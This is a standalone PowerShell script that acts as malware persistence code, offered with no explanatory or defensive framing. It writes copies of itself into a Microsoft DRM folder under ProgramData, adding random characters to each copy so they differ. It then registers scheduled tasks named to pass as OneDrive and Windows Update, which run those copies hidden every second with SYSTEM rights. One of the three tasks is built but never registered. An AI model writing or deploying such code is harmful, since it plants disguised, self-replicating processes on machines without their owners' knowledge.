function Gen-Info {
    # CREATION
    $alfa_path = "C:\ProgramData\Microsoft\DRM"
    $bravo_path = "C:\ProgramData\Microsoft\DRM"
    $charlie_path = "C:\ProgramData\Microsoft\DRM"
    
    $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
    $funcBody = (Get-Command Gen-Info).ScriptBlock.ToString()
    if (-not (Test-Path "$alfa_path\alfa.ps1")) {
        "function Gen-Info {$funcBody`n}`n# $random_chars" | Out-File -FilePath "$alfa_path\alfa.ps1" -Encoding UTF8
    }
    
    $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
    if (-not (Test-Path "$bravo_path\bravo.ps1")) {
        "function Gen-Info {$funcBody`n}`n# $random_chars" | Out-File -FilePath "$bravo_path\bravo.ps1" -Encoding UTF8
    }
    
    $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
    if (-not (Test-Path "$charlie_path\charlie.ps1")) {
        "function Gen-Info {$funcBody`n}`n# $random_chars" | Out-File -FilePath "$charlie_path\charlie.ps1" -Encoding UTF8
    }
    
    
    # SCHEDULE TASK CREATION
    
    $task_alfa = "MicrosoftUpdate"
    if (-not (Get-ScheduledTask -TaskName $task_alfa -ErrorAction SilentlyContinue)) {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File $alfa_path\alfa.ps1"
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Seconds 1)
    }
    
    $task_bravo = "OneDrive"
    if (-not (Get-ScheduledTask -TaskName $task_bravo -ErrorAction SilentlyContinue)) {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File $bravo_path\bravo.ps1"
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Seconds 1)
        Register-ScheduledTask -TaskName $task_bravo -Action $action -Trigger $trigger -User "SYSTEM"
    }
    
    $task_charlie = "WindowsUpdate"
    if (-not (Get-ScheduledTask -TaskName $task_charlie -ErrorAction SilentlyContinue)) {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File $charlie_path\charlie.ps1"
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Seconds 1)
        Register-ScheduledTask -TaskName $task_charlie -Action $action -Trigger $trigger -User "SYSTEM"
    }
}

Gen-Info
